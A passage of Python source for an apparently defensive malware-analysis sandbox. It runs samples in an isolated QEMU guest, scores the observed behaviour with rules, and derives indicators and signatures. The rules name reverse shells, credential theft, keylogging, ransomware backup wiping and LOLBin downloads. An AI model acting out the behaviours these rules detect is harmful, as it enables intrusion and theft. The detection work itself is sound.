        os.makedirs(payload_dir, exist_ok=True)
        overlay = os.path.join(work, "overlay.qcow2")
        pcap = os.path.join(work, "guest.pcap")
        agent_sock = os.path.join(work, "agent.sock")
        try:
            # The sample keeps its real extension: on Windows the extension is
            # what decides how the object is opened, so stripping it would
            # change what we are actually testing.
            name = "sample" + self._extension(tr.file_type, meta)
            with open(os.path.join(payload_dir, name), "wb") as fh:
                fh.write(data)
            with open(os.path.join(payload_dir, "crucible.json"), "w") as fh:
                json.dump({"sample": name, "sha256": sha256,
                           "timeout": timeout,
                           "file_type": tr.file_type or ""}, fh)

            # Copy-on-write overlay: the base image is opened read-only and is
            # byte-identical after every run, so one prepared guest serves an
            # unlimited number of detonations with no reprovisioning.
            r = subprocess.run(["qemu-img", "create", "-q", "-f", "qcow2",
                                "-b", os.path.abspath(prof.image), "-F", "qcow2",
                                overlay], capture_output=True, timeout=60)
            if r.returncode != 0:
                msg = r.stderr.decode("utf-8", "replace").strip()[:200]
                tr.errors.append("overlay creation failed: %s" % msg)
                tr.add("error", "overlay_failed", msg)
                return tr

            listener = _AgentChannel(agent_sock)
            listener.start()
            argv = self._qemu_argv(prof, overlay, payload_dir, agent_sock,
                                   pcap if self.capture else None)
            budget = timeout + prof.boot_seconds
            try:
                proc = subprocess.run(argv, capture_output=True, timeout=budget)
                qerr = proc.stderr.decode("utf-8", "replace")[-1000:]
                if proc.returncode != 0 and qerr.strip():
                    tr.add("error", "qemu_exit",
                           "qemu rc=%d: %s" % (proc.returncode, qerr.strip()[:200]))
            except subprocess.TimeoutExpired:
                tr.add("evade", "guest_hung",
                       "guest did not finish inside %ds" % budget, live=True)
            finally:
                listener.stop()

            tr.executed = listener.saw_agent
            if not listener.saw_agent:
                tr.errors.append("guest agent never reported in")
                tr.add("error", "no_agent",
                       "no observations arrived on the agent channel")
            self._fold_agent(listener.records, tr)
            if self.capture and os.path.exists(pcap):
                pkts = parse_pcap(pcap, tr)
                tr.add("meta", "captured_packets", "%d frames" % pkts,
                       value=str(pkts))
        finally:
            shutil.rmtree(work, ignore_errors=True)
        tr.duration = time.time() - t0
        return tr

    @staticmethod
    def _extension(ftype: Optional[str], meta: dict) -> str:
        given = (meta or {}).get("filename") or ""
        if "." in given[-8:]:
            return given[given.rfind("."):][:8]
        return {"pe": ".exe", "ole": ".doc", "zip": ".docx", "pdf": ".pdf",
                "php": ".php", "html_js": ".html", "script": ".vbs"}.get(
                    ftype or "", ".bin")

    def _qemu_argv(self, prof: GuestProfile, overlay: str, payload_dir: str,
                   agent_sock: str, pcap: Optional[str]) -> List[str]:
        """Assemble the QEMU command line.

        The isolation-critical parts are `restrict=on` (SLIRP answers nothing
        and forwards nothing, so the guest reaches neither the host nor the
        internet), the read-only FAT view of the payload directory, and `-snapshot`
        on top of an already copy-on-write overlay.
        """
        accel = prof.accel
        if accel == "kvm" and not os.path.exists("/dev/kvm"):
            accel = "tcg"
        argv = [prof.qemu,
                "-nodefaults", "-no-user-config", "-display", "none",
                "-m", str(prof.memory_mb), "-smp", str(prof.cpus),
                "-accel", accel,
                "-drive", "file=%s,format=qcow2,if=virtio,snapshot=on" % overlay,
                # the sample, as a read-only removable volume
                "-drive", "file=fat:ro:%s,format=raw,if=none,id=payload,"
                          "media=disk" % payload_dir,
                "-device", "virtio-blk-pci,drive=payload,serial=CRUCIBLE",
                # the observation channel
                "-chardev", "socket,id=crucible,path=%s,server=on,wait=off"
                            % agent_sock,
                "-device", "virtio-serial-pci",
                "-device", "virtserialport,chardev=crucible,name=ffn.crucible.0",
                # isolated user-mode network
                "-netdev", "user,id=n0,restrict=on",
                "-device", "virtio-net-pci,netdev=n0",
                ]
        if prof.machine:
            argv += ["-machine", prof.machine]
        if pcap:
            argv += ["-object",
                     "filter-dump,id=tap,netdev=n0,file=%s" % pcap]
        argv += list(prof.extra_args)
        return argv

    @staticmethod
    def _fold_agent(records: List[dict], tr: BehaviorTrace) -> None:
        """Absorb the guest agent's observation stream.

        The agent reports in our own vocabulary -- kind/what/detail/value --
        so a new guest OS needs no changes here, only an agent that speaks it.
        Anything with an unrecognised kind is kept as a capability rather than
        dropped, so a future agent extension degrades instead of vanishing.
        """
        for rec in records:
            if not isinstance(rec, dict):
                continue
            if rec.get("done"):
                tr.add("meta", "agent_complete", "guest agent finished cleanly")
                continue
            kind = str(rec.get("kind", ""))[:16]
            what = str(rec.get("what", ""))[:48]
            if not what:
                continue
            if kind not in OBS_KINDS:
                kind = "capability"
            tr.add(kind, what, str(rec.get("detail", ""))[:400], live=True,
                   value=str(rec.get("value", ""))[:512])
            if rec.get("dropped"):
                d = rec["dropped"]
                if isinstance(d, dict) and d.get("name"):
                    tr.dropped.append({"name": str(d["name"])[:256],
                                       "size": int(d.get("size", 0) or 0),
                                       "sha256": str(d.get("sha256", ""))[:64],
                                       "type": str(d.get("type", ""))[:16]})


class _AgentChannel:
    """Collects newline-delimited JSON from the guest over a unix socket."""

    def __init__(self, path: str, *, limit: int = 4096):
        self.path = path
        self.limit = limit
        self.records: List[dict] = []
        self.saw_agent = False
        self._stop = threading.Event()
        self._sock: Optional[socket.socket] = None
        self._thread: Optional[threading.Thread] = None

    def start(self) -> None:
        # QEMU is the server (server=on) and we connect; but it only creates
        # the socket once it starts, so we poll for it in the reader thread.
        self._thread = threading.Thread(target=self._read, daemon=True,
                                        name="crucible-agent")
        self._thread.start()

    def _read(self) -> None:
        deadline = time.time() + 300
        conn = None
        while not self._stop.is_set() and time.time() < deadline and conn is None:
            if os.path.exists(self.path):
                try:
                    conn = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
                    conn.settimeout(1.0)
                    conn.connect(self.path)
                except OSError:
                    conn = None
                    time.sleep(0.2)
            else:
                time.sleep(0.2)
        if conn is None:
            return
        self._sock = conn
        buf = b""
        while not self._stop.is_set():
            try:
                chunk = conn.recv(8192)
            except socket.timeout:
                continue
            except OSError:
                break
            if not chunk:
                break
            self.saw_agent = True
            buf += chunk
            while b"\n" in buf and len(self.records) < self.limit:
                line, buf = buf.split(b"\n", 1)
                line = line.strip()
                if not line:
                    continue
                try:
                    self.records.append(json.loads(line.decode("utf-8", "replace")))
                except ValueError:
                    continue
            if len(buf) > (1 << 20):        # a guest that never sends a newline
                buf = buf[-4096:]

    def stop(self) -> None:
        self._stop.set()
        if self._sock is not None:
            try:
                self._sock.close()
            except OSError:
                pass
        if self._thread is not None:
            self._thread.join(timeout=3.0)


# ===========================================================================
# The assay
#
# Rules are COMBINATIONS, not single indicators, because single indicators are
# how sandboxes generate false positives. "Imports VirtualAllocEx" describes
# half of Windows; "allocated memory in another process AND wrote to it AND
# created a thread there" describes an injector and almost nothing else.
#
# Each rule states what must be present, what may substitute, and what must be
# absent. A rule that matched only on static inference is discounted, because
# a string is a claim and a syscall is a fact.
# ===========================================================================
LIVE_DISCOUNT = 0.55          # weight multiplier when no live evidence backs a rule

# Thresholds on the 0..100 assay score.
SCORE_MALWARE = 70
SCORE_GRAYWARE = 35


@dataclass
class BehaviorRule:
    name: str                                  # threat-name fragment
    weight: int                                # score contribution when matched
    verdict: str = "malware"                   # class this rule asserts
    requires: Tuple[str, ...] = ()              # every token must be present
    any_of: Tuple[str, ...] = ()                # at least one must be present
    absent: Tuple[str, ...] = ()                # none may be present
    live_only: bool = False                    # ignore unless live evidence
    why: str = ""                              # operator-facing explanation
    # Rules sharing a cap_group are alternative views of ONE fact, so the group
    # contributes its single highest weight instead of the sum. Without this,
    # nested rules (one implying another) silently double-count and can carry a
    # class past a threshold it was never meant to reach.
    cap_group: str = ""

    def matches(self, present: set, strong: set,
                live: set) -> Tuple[bool, bool]:
        """(matched, backed_by_strong_evidence).

        `strong` holds tokens with at least one runtime- or content-derived
        observation behind them. A rule that matched only on import-table
        inference is real but discounted -- see LIVE_DISCOUNT.
        """
        pool = live if self.live_only else present
        if any(t not in pool for t in self.requires):
            return False, False
        if self.any_of and not any(t in pool for t in self.any_of):
            return False, False
        if any(t in present for t in self.absent):
            return False, False
        touched = tuple(self.requires) + tuple(self.any_of)
        backed = any(t in strong for t in touched) if touched else False
        return True, backed


# Rule order does not matter; every matching rule contributes. The highest
# weighted match names the threat.
RULES: List[BehaviorRule] = [
    BehaviorRule("Injector", 85, "malware",
                 requires=("capability:proc_inject",),
                 any_of=("capability:proc_alloc", "capability:rwx"),
                 why="writes code into another process and runs it"),
    BehaviorRule("Dropper", 90, "malware",
                 requires=("file:dropped_executable",),
                 any_of=("net:dns_query", "net:connect", "net:http_request",
                         "capability:download"),
                 live_only=True,
                 why="fetched something from the network and wrote an executable"),
    BehaviorRule("Downloader", 65, "malware",
                 requires=("capability:download", "capability:exec"),
                 why="retrieves a payload and executes it"),
    # A single ransom-suffixed file used to convict at 95 with high confidence.
    # _classify_path emits crypto:ransom_extension PER FILE, so one stray
    # backup artefact named *.enc anywhere in a scanned tree was a conviction.
    # The destructive commands and the ransom note are still damning on their
    # own -- there is no innocent reason to delete shadow copies -- but the
    # extension now needs corroboration, which derive_aggregates supplies.
    BehaviorRule("Ransomware", 95, "malware",
                 any_of=("crypto:ransom_note", "crypto:wipe_shadow",
                         "crypto:wipe_backup", "crypto:ransom_spread"),
                 why="behaves like ransomware: ransom notes, many rewritten "
                     "files, or destruction of recovery data"),
    BehaviorRule("Crypto.SuspiciousRewrite", 40, "grayware",
                 requires=("crypto:ransom_extension",),
                 absent=("crypto:ransom_spread",),
                 why="wrote a file with a ransom-associated suffix, but only "
                     "one -- suspicious, not conclusive"),
    BehaviorRule("Backdoor.ReverseShell", 85, "malware",
                 requires=("capability:revshell",),
                 why="opens an interactive shell to a remote host"),
    BehaviorRule("Webshell", 85, "malware",
                 requires=("capability:webshell",),
                 why="executes attacker-supplied requests server-side"),
    BehaviorRule("MacroDropper", 85, "malware",
                 requires=("capability:macro_auto",),
                 any_of=("capability:exec", "capability:download",
                         "capability:obfuscation"),
                 why="a document whose macro runs on open and then executes "
                     "or downloads"),
    BehaviorRule("RemoteTemplate", 70, "malware",
                 requires=("net:remote_template",),
                 why="a document that fetches its payload from a remote target"),
    BehaviorRule("Exploit.EquationEditor", 90, "malware",
                 requires=("evade:exploit_eqn",),
                 why="carries an Equation Editor object, a known exploit vehicle"),
    BehaviorRule("DDEExec", 80, "malware",
                 requires=("capability:dde_exec",),
                 why="uses a DDE field to run a command on open"),
    BehaviorRule("Keylogger", 70, "malware",
                 requires=("capability:keylog",),
                 why="captures keystrokes or installs an input hook"),
    BehaviorRule("CredentialTheft", 75, "malware",
                 requires=("capability:cred_theft",),
                 why="reads stored credentials"),
    BehaviorRule("Persistence", 40, "grayware",
                 any_of=("persist:persist_reg", "persist:persist_cron",
                         "persist:persist_init", "persist:persist_unit",
                         "persist:persist_ssh", "persist:persist_task",
                         "persist:persist_preload", "persist:persist_profile",
                         "persist:persist_desktop"),
                 why="installs itself to survive a reboot"),
    BehaviorRule("PersistentImplant", 80, "malware",
                 requires=("file:dropped_executable",),
                 any_of=("persist:persist_reg", "persist:persist_cron",
                         "persist:persist_init", "persist:persist_unit",
                         "persist:persist_ssh", "persist:persist_task",
                         "persist:persist_preload"),
                 why="drops an executable and arranges for it to be run again"),
    BehaviorRule("PrivilegeEscalation", 70, "malware",
                 any_of=("file:priv_escalation", "file:account_change"),
                 why="modifies the account or sudo databases"),
    BehaviorRule("Fileless", 75, "malware",
                 requires=("capability:fileless",),
                 any_of=("capability:exec", "process:exec"),
                 why="executes from anonymous memory, leaving nothing on disk"),
    BehaviorRule("Lolbin.Downloader", 80, "malware",
                 requires=("capability:lolbin_download",),
                 why="uses a signed system binary as a file downloader, which "
                     "has no legitimate use in traffic"),
    BehaviorRule("Lolbin.RemoteExec", 85, "malware",
                 requires=("capability:remote_exec",),
                 why="executes code fetched from a URL through a signed "
                     "system binary"),
    BehaviorRule("PowerShell.EncodedCommand", 80, "malware",
                 requires=("capability:encoded_command",),
                 why="runs a base64-encoded command line, which is how a "
                     "dropper hides its payload from log review"),
    BehaviorRule("Obfuscated.Loader", 55, "malware",
                 requires=("capability:obfuscation", "capability:exec"),
                 why="decodes a hidden payload and executes it"),
    BehaviorRule("Packed", 35, "grayware",
                 any_of=("meta:packer", "meta:no_imports",
                         "meta:unpacks_at_runtime"),
                 why="hides its real content until it runs"),
    # Evasion must never be silence. These fire on the anti-analysis tokens
    # alone -- with no co-factor required -- because a sample whose ONLY
    # observed behaviour is checking whether it is being watched has told us
    # something, and the previous rule set scored it zero.
    BehaviorRule("Evasive.SandboxCheck", 45, "grayware",
                 any_of=("evade:evade_vm", "evade:evade_dbg",
                         "capability:evade_vm", "capability:evade_dbg"),
                 why="probed for a virtual machine or a debugger",
                 cap_group="evasion"),
    BehaviorRule("Evasive.Refused", 50, "grayware",
                 requires=("evade:evade_vm",),
                 absent=("process:exec", "file:write", "net:dns_query",
                         "net:connect", "net:http_request"),
                 live_only=True,
                 why="checked for a sandbox and then did nothing else, which "
                     "is what a sample does when it decides it is being "
                     "watched",
                 cap_group="evasion"),
    BehaviorRule("Evasive.Hung", 40, "grayware",
                 any_of=("evade:guest_hung", "evade:hung"),
                 why="had to be killed rather than finishing, so the run is "
                     "incomplete and its silence proves nothing",
                 cap_group="evasion"),
    BehaviorRule("Persistence.Windows", 55, "grayware",
                 any_of=("persist:persist_startup", "persist:persist_ifeo",
                         "persist:hosts_file"),
                 why="installs itself through a Windows autostart mechanism"),
    BehaviorRule("AntiAnalysis", 45, "grayware",
                 requires=("capability:evade_dbg",),
                 any_of=("meta:packer", "capability:proc_inject",
                         "capability:rwx", "meta:no_imports"),
                 why="checks for a debugger and is also packed or injecting"),
    BehaviorRule("C2Beacon", 70, "malware",
                 requires=("process:ran_to_timeout",),
                 any_of=("net:http_request", "net:dns_query", "net:connect"),
                 live_only=True,
                 why="kept running and kept contacting a remote host"),
    BehaviorRule("Pdf.AutoScript", 70, "malware",
                 requires=("capability:pdf_autorun",),
                 any_of=("capability:pdf_js", "capability:exec",
                         "capability:pdf_embed"),
                 why="a PDF that runs script or launches content on open"),
    BehaviorRule("Pdf.Script", 40, "grayware",
                 requires=("capability:pdf_js",),
                 why="a PDF carrying JavaScript"),
    BehaviorRule("Encoded.Executable", 80, "malware",
                 requires=("meta:embedded_executable",),
                 any_of=("capability:obfuscation", "capability:exec",
                         "capability:download"),
                 why="carries an encoded executable and the means to run it"),
    BehaviorRule("Document.WithExecutable", 75, "malware",
                 requires=("meta:embedded_executable", "meta:container"),
                 why="a document containing an executable object"),
    BehaviorRule("Macro", 40, "grayware",
                 requires=("capability:macro",),
                 absent=("capability:macro_auto",),
                 why="a document carrying macros"),
    BehaviorRule("Overlay.Dropper", 60, "malware",
                 requires=("meta:overlay", "meta:embedded_executable"),
                 why="an executable with a second executable appended"),
    BehaviorRule("MassFileRewrite", 85, "malware",
                 requires=("crypto:mass_rewrite",),
                 live_only=True,
                 why="rewrote a large number of unrelated files"),
    BehaviorRule("EICAR.Test", 100, "malware",
                 requires=("capability:eicar",),
                 why="the EICAR anti-malware test file"),
]


# Addresses that must NEVER become IOCs. The sinkhole answers every lookup with
# its own address and SLIRP hands the guest 10.0.2.x, so without this filter a
# convicted sample would have us blocklist our own analysis network -- and
# 127.0.0.1 in a hash blocklist pushed to the FPGA would be a self-inflicted
# outage. Reserved ranges are excluded for the same reason.
_RESERVED_V4 = (
    ("0.", 1), ("10.", 3), ("127.", 4), ("169.254.", 8), ("172.16.", 7),
    ("172.17.", 7), ("172.18.", 7), ("172.19.", 7), ("172.2", 5),
    ("172.30.", 7), ("172.31.", 7), ("192.168.", 8), ("224.", 4),
    ("255.", 4), ("100.64.", 7),
)
# Trailing labels that prove a token is a FILENAME, not a hostname. A PE import
# table is full of things the domain regex likes (kernel32.dll, msvcrt.dll) and
# without this every report on a Windows binary carries its own DLL list as
# "observed domains".
# A candidate hostname is accepted only if its last label is a plausible TLD.
# Two-letter alphabetic labels pass as ccTLDs; otherwise the label must be in
# this list. Without it, `app.alert` from a PDF's JavaScript and
# `vbaProject.binAttribute` from a zip's raw bytes both looked like domains.
_KNOWN_TLD = {
    "com", "net", "org", "edu", "gov", "mil", "int", "info", "biz", "name",
    "pro", "aero", "coop", "museum", "jobs", "mobi", "travel", "tel", "asia",
    "cat", "post", "xxx", "app", "dev", "io", "co", "me", "tv", "cc", "ws",
    "online", "site", "website", "space", "store", "shop", "tech", "cloud",
    "click", "link", "live", "life", "world", "today", "top", "xyz", "icu",
    "vip", "win", "bid", "loan", "work", "party", "review", "stream", "gdn",
    "download", "science", "cricket", "racing", "accountant", "date", "faith",
    "zip", "mov", "cfd", "sbs", "rest", "quest", "monster", "buzz", "fun",
    "cyou", "bond", "makeup", "beauty", "hair", "skin", "ru", "su", "cn",
    "br", "in", "uk", "de", "fr", "nl", "eu", "us", "ca", "au", "jp", "kr",
    "pw", "to", "ml", "ga", "cf", "gq", "tk", "am", "at", "be", "ch", "cz",
    "dk", "es", "fi", "gr", "hu", "ie", "il", "it", "lt", "lv", "mx", "my",
    "no", "nz", "pl", "pt", "ro", "se", "sg", "sk", "th", "tr", "tw", "ua",
    "vn", "za",
}
_NON_TLD = {
    "dll", "exe", "sys", "so", "dylib", "ocx", "cpl", "drv", "scr", "com",
    "bin", "dat", "tmp", "temp", "log", "txt", "xml", "json", "html", "htm",
    "js", "css", "py", "sh", "bat", "cmd", "ps1", "vbs", "lib", "obj", "pdb",
    "ini", "cfg", "conf", "db", "sqlite", "png", "jpg", "gif", "ico", "css",
    "class", "jar", "img", "iso", "zip", "gz", "xz", "rar", "cab", "msi",
}
# Hostnames that mean nothing as an indicator.
_STOP_HOSTS = {
    "localhost", "localhost.localdomain", "wpad", "example.com", "example.org",
    "example.net", "invalid", "local", "arpa", "in-addr.arpa", "ip6.arpa",
}
# Values too generic to make a content signature out of.
_STOP_VALUES = {
    "/", "/index.html", "/index.php", "/favicon.ico", "/robots.txt", "sample",
    "sample.exe", "a.out", "test", "tmp", "temp", "/api", "/health",
}
# User-Agent strings belonging to real software; a match on one of these would
# fire on legitimate traffic.
_COMMON_UA = ("mozilla/5.0", "curl/", "wget/", "python-requests", "python-urllib",
              "okhttp", "java/", "go-http-client", "libwww-perl", "apache-httpclient")


# Hosts that appear inside files BECAUSE OF THE FORMAT, not because of intent.
# Matched as suffixes. Deliberately narrow: standards namespaces and PKI only.
# General CDNs and code-hosting are NOT here, and must not be added -- payload
# staging on those is commonplace, so allowlisting them would create exactly
# the blind spot an attacker would choose.
_FORMAT_INFRA = (
    # XML / document namespaces
    "schemas.openxmlformats.org", "schemas.microsoft.com", "schemas.xmlsoap.org",
    "purl.org", "w3.org", "ns.adobe.com", "adobe.com/xap", "oasis-open.org",
    "openoffice.org", "iso.org", "iec.ch", "aiim.org", "npes.org",
    "dublincore.org", "openxmlformats.org", "microsoft.com/office",
    # PKI: OCSP responders, CRL distribution points, policy statements
    "ocsp.digicert.com", "crl.digicert.com", "digicert.com",
    "verisign.com", "symcb.com", "symcd.com", "thawte.com",
    "globalsign.com", "globalsign.net", "sectigo.com", "comodoca.com",
    "usertrust.com", "letsencrypt.org", "entrust.net", "godaddy.com/repository",
    "certum.pl", "quovadisglobal.com", "swisssign.com", "identrust.com",
    "starfieldtech.com", "trustwave.com", "camerfirma.com",
)


def _is_format_infra(value: str) -> bool:
    """True for a host or URL that a file format or a CA put there."""
    v = value.strip().lower()
    if v.startswith(("http://", "https://", "ftp://")):
        v = v.split("://", 1)[1]
    host = v.split("/", 1)[0].split(":", 1)[0].strip(".")
    for suffix in _FORMAT_INFRA:
        base = suffix.split("/", 1)[0]
        if host == base or host.endswith("." + base):
            return True
    return False


def _host_of(url: str) -> str:
    """The hostname inside a URL, or an empty string."""
    v = url.strip()
    if "://" in v:
        v = v.split("://", 1)[1]
    host = v.split("/", 1)[0].split("?", 1)[0]
    if "@" in host:
        host = host.rsplit("@", 1)[1]
    return host.split(":", 1)[0].strip(".").lower()


def _is_reserved_ip(ip: str) -> bool:
    for prefix, _n in _RESERVED_V4:
        if ip.startswith(prefix):
            return True
    return False


def _plausible_host(host: str) -> bool:
    h = host.strip().strip(".").lower()
    if not h or len(h) > 253 or h in _STOP_HOSTS:
        return False
    if h.endswith((".local", ".localdomain", ".arpa", ".internal", ".test",
                   ".invalid", ".example")):
        return False
    if re.match(r"^\d{1,3}(\.\d{1,3}){3}$", h):
        return not _is_reserved_ip(h)
    if "." not in h:
        return False
    tld = h.rsplit(".", 1)[1]
    if tld in _NON_TLD:
        return False
    if not (tld in _KNOWN_TLD or (len(tld) == 2 and tld.isalpha())):
        return False
    return re.match(r"^[a-z0-9._-]+$", h) is not None


@dataclass
class AssayResult:
    """The verdict, and everything needed to justify and enforce it."""
    verdict: str = "unknown"
    score: int = 0
    threat_name: str = ""
    matched: List[Tuple[str, int, bool, str]] = field(default_factory=list)
    iocs: List[Tuple[str, str, str, str]] = field(default_factory=list)
    signatures: List = field(default_factory=list)
    reasons: List[str] = field(default_factory=list)
    confidence: str = "low"                    # low / medium / high

    def explain(self) -> str:
        head = "%s score=%d %s (confidence %s)" % (
            self.verdict.upper(), self.score, self.threat_name or "-",
            self.confidence)
        return "\n".join([head] + ["    - " + r for r in self.reasons])


def assay(tr: BehaviorTrace) -> AssayResult:
    """Score a trace and derive the enforceable content that follows from it."""
    present = {"%s:%s" % (o.kind, o.what) for o in tr.observations}
    strong = {"%s:%s" % (o.kind, o.what) for o in tr.observations if o.strong}
    live = {"%s:%s" % (o.kind, o.what) for o in tr.observations if o.live}
    res = AssayResult()

    total = 0.0
    capped: Dict[str, float] = {}          # cap_group -> highest weight seen
    capped_tokens: set = set()             # tokens a capped rule already scored
    for rule in RULES:
        ok, backed = rule.matches(present, strong, live)
        if not ok:
            continue
        weight = rule.weight * (1.0 if backed else LIVE_DISCOUNT)
        if rule.cap_group:
            # Several views of one fact: keep the strongest, add nothing more.
            prev = capped.get(rule.cap_group, 0.0)
            capped[rule.cap_group] = max(prev, weight)
            # ...and withhold that fact from the loose tally below, which would
            # otherwise score the same tokens a second time and undo the cap.
            capped_tokens.update(rule.requires)
            capped_tokens.update(rule.any_of)
        else:
            total += weight
        res.matched.append((rule.name, int(weight), backed, rule.why))
        res.reasons.append("%s (%+d%s%s): %s" % (
            rule.name, int(weight),
            "" if backed else ", from imports only",
            ", capped with %s" % rule.cap_group if rule.cap_group else "",
            rule.why))
    total += sum(capped.values())

    # Unmatched capability weight still counts, but weakly and with a ceiling:
    # a binary importing many suspicious APIs without forming a known pattern
    # deserves suspicion, not conviction.
    loose = 0.0
    for obs in tr.observations:
        if obs.kind not in ("capability", "persist", "crypto", "evade"):
            continue
        if ("%s:%s" % (obs.kind, obs.what)) in capped_tokens:
            continue                       # already scored, under a cap
        w = TOKEN_WEIGHT.get(obs.what)
        if not w:
            continue
        contrib = w / 6.0
        if not obs.strong:
            contrib *= LIVE_DISCOUNT
        loose += contrib
    loose = int(min(loose, 25))
    if loose:
        total += loose
        res.reasons.append("assorted suspicious capabilities (+%d)" % loose)

    res.score = int(min(round(total), 100))

    # -- verdict -----------------------------------------------------------
    if res.score >= SCORE_MALWARE:
        res.verdict = "malware"
    elif res.score >= SCORE_GRAYWARE:
        res.verdict = "grayware"
    elif tr.executable_shaped() and not tr.conclusive():
        # Refuse to call an executable benign unless the run that looked at it
        # could actually have seen misbehaviour.
        #
        # This used to be gated on `tr.fidelity == 0`, which inverted the
        # evidence. A chamber with fidelity > 0 switched the guard OFF even
        # when it observed nothing at all, and even when it had failed --
        # QemuChamber and JailChamber build their trace with
        # fidelity=self.fidelity BEFORE any error return. So an evasive sample
        # that detected the sandbox and exited, and a chamber whose guest never
        # booted, both came back `benign score=0`. A run that learned nothing
        # is LESS informative about safety than static analysis, not more:
        # the sample may simply have declined to run.
        res.verdict = "unknown"
        res.reasons.append(tr.inconclusive_reason())
    else:
        res.verdict = "benign"

    if res.matched:
        res.threat_name = max(res.matched, key=lambda m: m[1])[0]
    elif res.verdict in ("malware", "grayware"):
        res.threat_name = "Suspicious.Generic"

    # -- confidence --------------------------------------------------------
    # Driven by how the evidence was obtained, not by the score: a high score
    # from string matching is still a guess.
    # A rule is "backed" when strong evidence supports it. Runtime evidence is
    # what earns high confidence, because only execution can prove behaviour;
    # content evidence earns medium, and import-table inference earns low.
    backed_rules = [n for (n, _w, backed, _y) in res.matched if backed]
    runtime_tokens = bool(live)
    if res.matched and backed_rules and tr.executed and runtime_tokens:
        res.confidence = "high"
    elif backed_rules or tr.executed:
        res.confidence = "medium"
    else:
        res.confidence = "low"

    _assay_iocs(tr, res)
    _assay_signatures(tr, res)
    return res


def _assay_iocs(tr: BehaviorTrace, res: AssayResult) -> None:
    """Turn network observations into IOC rows.

    Live and static evidence are treated very differently. A domain the running
    sample actually resolved is condemned with the sample's own verdict. A
    domain merely present in its bytes is recorded as `unknown` -- observed but
    not charged -- because executables legitimately contain URLs, and
    blocklisting a vendor's update host from a string match is a self-inflicted
    outage.
    """
    condemn = res.verdict if res.verdict in ("malware", "phishing") else "unknown"
    # Statically-embedded infrastructure is charged only for a CONVICTED sample,
    # and only at malware/phishing -- never off a grayware or benign verdict,
    # where a string match is all we would be acting on.
    embedded = condemn
    seen: set = set()

    def add(ioc_type: str, value: str, verdict: str, name: str) -> None:
        v = value.strip().rstrip(".")
        if not v or (ioc_type, v.lower()) in seen or len(seen) >= 64:
            return
        seen.add((ioc_type, v.lower()))
        res.iocs.append((ioc_type, v, verdict, name))

    # Live observations first: the de-duplicator keeps the first name given to
    # a value, and "we watched it resolve this" outranks "we found this string".
    for obs in sorted(tr.observations, key=lambda o: not o.live):
        if obs.kind != "net" or not obs.value:
            continue
        v = obs.value
        if obs.what in ("dns_query", "tls_sni"):
            if _plausible_host(v):
                add("domain", v, condemn if obs.live else "unknown",
                    "C2.%s" % ("Resolved" if obs.what == "dns_query" else "SNI"))
        elif obs.what == "http_request":
            if _plausible_host(v):
                add("domain", v, condemn if obs.live else "unknown", "C2.HttpHost")
        elif obs.what == "connect":
            ip = v.rsplit(":", 1)[0].strip("[]")
            if not _is_reserved_ip(ip) and ":" not in ip:
                add("ip", ip, condemn if obs.live else "unknown", "C2.Connect")
        elif obs.what in ("static_url", "pdf_uri", "remote_template"):
            if _is_format_infra(v):
                continue                       # the format put it there
            # A remote-template target is the payload source: the reference IS
            # the attack, so it is charged whatever the overall verdict. Other
            # embedded URLs are charged only once the sample is convicted.
            charged = condemn if obs.what == "remote_template" else embedded
            add("url", v, charged,
                "C2.Url" if obs.live else "C2.Embedded"
                if charged != "unknown" else "Observed.Url")
            # Also charge the host on its own: the next build of this family
            # changes the path far more often than the infrastructure.
            host = _host_of(v)
            if host and _plausible_host(host) and not _is_format_infra(host):
                add("domain", host, charged,
                    "C2.EmbeddedHost" if charged != "unknown"
                    else "Observed.Domain")
        elif obs.what == "static_domain":
            if _plausible_host(v) and not _is_format_infra(v):
                add("domain", v, embedded,
                    "C2.Embedded" if embedded != "unknown"
                    else "Observed.Domain")
        elif obs.what == "static_ip":
            if not _is_reserved_ip(v):
                add("ip", v, embedded,
                    "C2.Embedded" if embedded != "unknown" else "Observed.Ip")

    # Reconstruct full URLs from a live host plus a live path: the pair is a
    # far more precise indicator than either half.
    hosts = [h for h in tr.values("net", "http_request") if _plausible_host(h)]
    paths = [p for p in tr.values("net", "http_uri") if p.startswith("/")]
    for h in hosts[:4]:
        for p in paths[:4]:
            if len(p) > 1:
                add("url", "http://%s%s" % (h, p), condemn, "C2.Endpoint")


def _assay_signatures(tr: BehaviorTrace, res: AssayResult) -> None:
    """Synthesise inline content signatures from the sample's own artefacts.

    Only for convicted samples, and only from artefacts distinctive enough to
    be worth matching on. The point is variant coverage: the next build of this
    family has a new hash, but it will still request the same URI path, send
    the same User-Agent, or drop the same filename -- which is what makes these
    signatures outlive the sample they came from.
    """
    if ContentSignature is None or res.verdict not in ("malware", "phishing"):
        return
    action = VERDICT_ACTION.get(res.verdict, ACTION_RESET)
    made: set = set()

    def emit(pattern: str, label: str, *, severity: str = "high") -> None:
        pat = pattern.strip()
        if (len(pat) < 8 or len(pat) > 256 or pat.lower() in _STOP_VALUES
                or pat.lower() in made or len(made) >= 8):
            return
        try:
            raw = pat.encode("utf-8")
        except UnicodeError:
            return
        # Overlap check: two rules matching the same bytes cost two pattern
        # slots in the compiled automaton and in the FPGA DPI region, and add
        # no coverage. The longest form of a construct is also the least
        # false-positive-prone, so an existing longer pattern wins and a
        # shorter one already emitted is replaced.
        low = pat.lower()
        for seen in list(made):
            if low in seen:
                return
            if seen in low:
                made.discard(seen)
                res.signatures[:] = [
                    sig for sig in res.signatures
                    if sig.pattern.decode("utf-8", "replace").lower() != seen]
        made.add(low)
        res.signatures.append(ContentSignature(
            sid=0,                             # assigned by the caller
            name="crucible.%s" % label,
            pattern=raw, nocase=True, action=action, severity=severity,
            threat_name="%s.%s" % (res.threat_name or "Crucible", label),
            verdict=res.verdict, source="crucible"))

    # 1) a non-standard User-Agent is close to a family fingerprint. Anchored
    #    to its header rather than emitted bare: a short token like "Nyx/1.4"
    #    matched anywhere in a payload is false-positive bait, while
    #    "User-Agent: Nyx/1.4" only matches where it means something.
    for ua in tr.values("net", "http_ua"):
        if not any(cu in ua.lower() for cu in _COMMON_UA):
            emit("User-Agent: " + ua, "UserAgent")

    # 2) the request path a beacon uses
    for uri in tr.values("net", "http_uri"):
        path = uri.split("?", 1)[0]
        if path.startswith("/") and len(path) >= 8:
            emit(path, "Uri", severity="medium")

    # 3) dropped filenames, which implants reuse across builds
    for d in tr.dropped:
        base = os.path.basename(d.get("name", ""))
        if base and base != "sample" and d.get("type") in ("pe", "elf", "macho"):
            emit(base, "DroppedName", severity="medium")

    # 4) whatever the guest agent flagged as a named runtime artefact
